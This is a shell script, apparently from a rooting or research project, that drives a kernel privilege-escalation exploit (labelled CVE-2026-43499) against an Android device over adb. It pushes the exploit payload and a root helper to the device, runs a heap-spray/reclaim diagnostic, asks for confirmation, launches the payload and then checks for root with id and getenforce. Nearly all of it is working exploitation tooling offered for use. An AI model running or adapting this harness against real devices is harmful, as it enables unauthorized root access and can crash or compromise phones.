#!/bin/sh
# asteroids bring-up: host-side driver for the on-device steps.
#
# Run from the repository root against the authorized A059 over USB:
#
#   sh diagnostics/asteroids/run-on-device.sh
#
# What it does, in order, stopping at the first failure:
#
#   1. push the diagnostic, standalone payload, root helper and tracefs kicker;
#   2. run the diagnostic. It cannot panic the device -- it stops before any
#      store the exploit exists to fire -- and it answers whether the spray
#      buffer the kernel accepted is the one the FOPS route presumes;
#   3. if the diagnostic's buffer is clean, run the payload itself once
#      (EXPLOIT_ATTEMPTS=1) and stream its log back. A miss here can panic
#      the device -- the rb_erase store aims into live memory on a lost
#      reclaim -- so it runs once, on your confirmation, not in a loop.
#
# The step-3 confirmation is a real question, not a formality: two earlier
# runs on this device ended in rb_erase_cached BUG_ON reboots.

set -eu

TARGET_DIR="build/asteroids_jp_6.1.157-android14-11-g82d681c9b06b-ab14634535"
DIAG="$TARGET_DIR/cve-2026-43499-diag-reclaim"
PAYLOAD="$TARGET_DIR/cve-2026-43499-standalone"
HELPER="$TARGET_DIR/cve-2026-43499-root"
KICKER="diagnostics/asteroids/kick-blocked-reason.sh"
DEVICE_DIR="/data/local/tmp/asteroids"

for f in "$DIAG" "$PAYLOAD" "$HELPER" "$KICKER"; do
  if [ ! -f "$f" ]; then
    echo "missing $f -- build first:" >&2
    echo "  make TARGET=asteroids/jp/6.1.157-android14-11-g82d681c9b06b-ab14634535 CORE=core61 all diag-reclaim" >&2
    exit 1
  fi
done

adb devices | sed -n '2p' | grep -q device || {
  echo "no device on adb" >&2
  exit 1
}

echo "== staging =="
adb shell "mkdir -p $DEVICE_DIR"
adb push "$DIAG" "$DEVICE_DIR/diag-reclaim" >/dev/null
adb push "$PAYLOAD" "$DEVICE_DIR/payload" >/dev/null
adb push "$HELPER" "/data/local/tmp/cve-2026-43499-root" >/dev/null
adb push "$KICKER" "$DEVICE_DIR/kick.sh" >/dev/null
adb shell "chmod 755 $DEVICE_DIR/diag-reclaim $DEVICE_DIR/payload \
  $DEVICE_DIR/kick.sh /data/local/tmp/cve-2026-43499-root"

echo "== diagnostic (no store fires; cannot panic) =="
adb shell "$DEVICE_DIR/diag-reclaim" 2>&1 | tee diag.log

if grep -q "BUFFER WRONG" diag.log; then
  echo "" >&2
  echo "diagnostic says the sprayed buffer itself is wrong -- the payload" >&2
  echo "builder disagrees with the route before anything reaches the kernel." >&2
  echo "Do not run the payload; it cannot land. Report diag.log." >&2
  exit 1
fi

sends=$(sed -n 's/.*sk_buff reclaim sends=\([0-9]*\).*/\1/p' diag.log | tail -1)
if [ -n "$sends" ] && [ "$sends" -lt 4 ]; then
  echo "" >&2
  echo "diagnostic reclaim sends=$sends (< 4): the page is being lost to" >&2
  echo "another allocator before the spray wins it. The full run's misc_fops" >&2
  echo "mismatch is the reclaim missing, not the store. Report diag.log." >&2
  exit 1
fi

echo ""
echo "The diagnostic buffer is clean and the reclaim sent $sends messages."
echo "The next step runs the real payload once. If the reclaim lost the page"
echo "this time, the rb_erase store aims into live memory and the device can"
echo "panic and reboot. That has happened twice on this device already."
printf "Run the payload once now? [y/N] "
read -r answer
case "$answer" in
  y|Y|yes) ;;
  *) echo "stopped before the payload"; exit 0 ;;
esac

echo "== payload, one attempt =="
adb shell "cd $DEVICE_DIR; sh ./kick.sh >/dev/null 2>&1 & kicker=\$!; \
  trap 'kill \$kicker 2>/dev/null' EXIT; EXPLOIT_ATTEMPTS=1 \
  EXPLOIT_ATTEMPT_TIMEOUT_SEC=300 ./payload" 2>&1 | tee run.log || true

echo ""
echo "== outcome =="
if grep -q "exploit completed" run.log && grep -q "done=1 root=1" run.log; then
  echo "root: done=1 root=1 -- the two markers the app gates on."
  adb shell "/data/local/tmp/cve-2026-43499-root -c \
    '/system/bin/id; /system/bin/cat /proc/self/attr/current; \
     /system/bin/getenforce; /system/bin/uname -r'" 2>&1 || true
else
  echo "no root. The useful lines:"
  grep -E "reclaim sends|misc_fops|pselect returned|cfi|done=" run.log || \
    echo "(none -- see run.log)"
  echo "Report diag.log and run.log."
fi
